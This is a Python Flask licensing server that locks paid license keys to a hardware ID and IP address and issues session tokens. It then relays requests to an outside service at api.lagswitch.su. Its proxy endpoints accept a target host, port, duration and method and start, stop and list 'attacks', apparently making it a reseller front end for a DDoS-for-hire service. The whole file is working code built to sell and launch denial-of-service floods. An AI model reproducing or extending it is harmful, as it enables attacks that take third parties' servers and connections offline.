import os
import sqlite3
import time
import secrets
from functools import wraps
import requests
from flask import Flask, jsonify, request

app = Flask(__name__)

# --- CONFIGURATION ---
DATABASE_FILE = 'licenses.db'
# IMPORTANT: This is the lifetime of a session token in seconds. 2 hours = 7200 seconds.
SESSION_LIFETIME_SECONDS = 7200 
# This is the master API key for the LagSwitch service.
# It will be read from an environment variable on Render for security.
LAGSWITCH_API_KEY = os.environ.get('LAGSWITCH_API_KEY')
if not LAGSWITCH_API_KEY:
    print("FATAL ERROR: LAGSWITCH_API_KEY environment variable not set.")
    # In a real scenario, you might want the app to fail to start.
    # For now, we'll let it run but proxy requests will fail.

# In-memory storage for active session tokens.
# Structure: { 'session_token': {'license_key': str, 'ip_address': str, 'creation_time': float} }
ACTIVE_SESSIONS = {}

# --- DATABASE SETUP ---
def init_db():
    conn = sqlite3.connect(DATABASE_FILE)
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS licenses (
            key TEXT PRIMARY KEY,
            hwid TEXT,
            ip_address TEXT,
            status TEXT DEFAULT 'active'
        )
    ''')
    conn.commit()
    conn.close()

# --- HELPER FUNCTIONS ---
def get_db_connection():
    conn = sqlite3.connect(DATABASE_FILE)
    conn.row_factory = sqlite3.Row
    return conn

def get_real_ip():
    # Render uses X-Forwarded-For header to pass the real client IP
    if 'X-Forwarded-For' in request.headers:
        return request.headers['X-Forwarded-For'].split(',')[0].strip()
    return request.remote_addr

# --- SESSION VALIDATION DECORATOR ---
def require_session(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        data = request.get_json()
        if not data or 'session_token' not in data:
            return jsonify({"status": "error", "message": "Session token missing."}), 401

        token = data['session_token']
        session_info = ACTIVE_SESSIONS.get(token)

        if not session_info:
            return jsonify({"status": "error", "message": "Invalid session token."}), 401

        # Check for expiration
        if time.time() - session_info['creation_time'] > SESSION_LIFETIME_SECONDS:
            ACTIVE_SESSIONS.pop(token, None) # Clean up expired token
            return jsonify({"status": "error", "message": "Session has expired."}), 401
        
        # IP Address check for security
        if session_info['ip_address'] != get_real_ip():
            return jsonify({"status": "error", "message": "IP address mismatch."}), 401

        # Add session info to the request context if needed by the endpoint
        request.session_info = session_info
        return f(*args, **kwargs)
    return decorated_function


# --- CORE ENDPOINTS ---
@app.route('/')
def home():
    return "Licensing Server is running."

@app.route('/validate', methods=['POST'])
def validate_license():
    data = request.get_json()
    license_key = data.get('license_key')
    machine_code = data.get('machine_code')
    user_ip = get_real_ip()

    if not license_key or not machine_code:
        return jsonify({"status": "error", "message": "Missing license key or machine code."}), 400

    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM licenses WHERE key = ?", (license_key,))
    license_data = cursor.fetchone()

    if not license_data:
        conn.close()
        return jsonify({"status": "error", "message": "License key not found."}), 404

    if license_data['status'] != 'active':
        conn.close()
        return jsonify({"status": "error", "message": f"License is not active (status: {license_data['status']})."}), 403

    # First-time activation: lock HWID and IP
    if not license_data['hwid']:
        cursor.execute("UPDATE licenses SET hwid = ?, ip_address = ? WHERE key = ?", (machine_code, user_ip, license_key))
        conn.commit()
    else:
        # Subsequent validation: check if HWID and IP match
        if license_data['hwid'] != machine_code:
            conn.close()
            return jsonify({"status": "error", "message": "HWID does not match."}), 403
        if license_data['ip_address'] != user_ip:
            conn.close()
            return jsonify({"status": "error", "message": "IP address does not match."}), 403
    
    conn.close()

    # --- SUCCESS: GENERATE AND RETURN A SESSION TOKEN ---
    session_token = f"sess_{secrets.token_hex(24)}"
    ACTIVE_SESSIONS[session_token] = {
        'license_key': license_key,
        'ip_address': user_ip,
        'creation_time': time.time()
    }

    return jsonify({
        "status": "success",
        "message": "Validation successful. Session created.",
        "session_token": session_token
    })


# --- PROXY ENDPOINTS ---
# These endpoints require a valid session and will relay requests to the actual service.

@app.route('/proxy/start', methods=['POST'])
@require_session
def proxy_start():
    if not LAGSWITCH_API_KEY:
        return jsonify({"status": "error", "message": "Server configuration error."}), 500

    client_data = request.get_json()
    api_params = {
        "key": LAGSWITCH_API_KEY,
        "host": client_data.get('host'),
        "port": client_data.get('port'),
        "time": client_data.get('time'),
        "method": client_data.get('method'),
    }
    try:
        response = requests.get("https://api.lagswitch.su/start", params=api_params, timeout=25)
        return jsonify(response.json()), response.status_code
    except Exception as e:
        return jsonify({"status": "error", "message": f"Failed to contact service: {e}"}), 502


@app.route('/proxy/stop', methods=['POST'])
@require_session
def proxy_stop():
    if not LAGSWITCH_API_KEY:
        return jsonify({"status": "error", "message": "Server configuration error."}), 500
    
    attack_id = request.get_json().get('attack_id')
    if not attack_id:
        return jsonify({"status": "error", "message": "Attack ID missing."}), 400

    api_params = {"key": LAGSWITCH_API_KEY}
    try:
        response = requests.get(f"https://api.lagswitch.su/stop/{attack_id}", params=api_params, timeout=25)
        return jsonify(response.json()), response.status_code
    except Exception as e:
        return jsonify({"status": "error", "message": f"Failed to contact service: {e}"}), 502


@app.route('/proxy/stop_all', methods=['POST'])
@require_session
def proxy_stop_all():
    if not LAGSWITCH_API_KEY:
        return jsonify({"status": "error", "message": "Server configuration error."}), 500

    api_params = {"key": LAGSWITCH_API_KEY}
    try:
        response = requests.get("https://api.lagswitch.su/stop_all", params=api_params, timeout=25)
        return jsonify(response.json()), response.status_code
    except Exception as e:
        return jsonify({"status": "error", "message": f"Failed to contact service: {e}"}), 502


@app.route('/proxy/status', methods=['POST'])
@require_session
def proxy_status():
    if not LAGSWITCH_API_KEY:
        return jsonify({"status": "error", "message": "Server configuration error."}), 500
        
    api_params = {"key": LAGSWITCH_API_KEY}
    try:
        response = requests.get("https://api.lagswitch.su/status", params=api_params, timeout=25)
        # The status endpoint returns raw text, so we handle it differently
        return response.text, response.status_code
    except Exception as e:
        return jsonify({"status": "error", "message": f"Failed to contact service: {e}"}), 502


if __name__ == '__main__':
    init_db()
    # Note: On Render, gunicorn will be used to run the app, not this line.
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
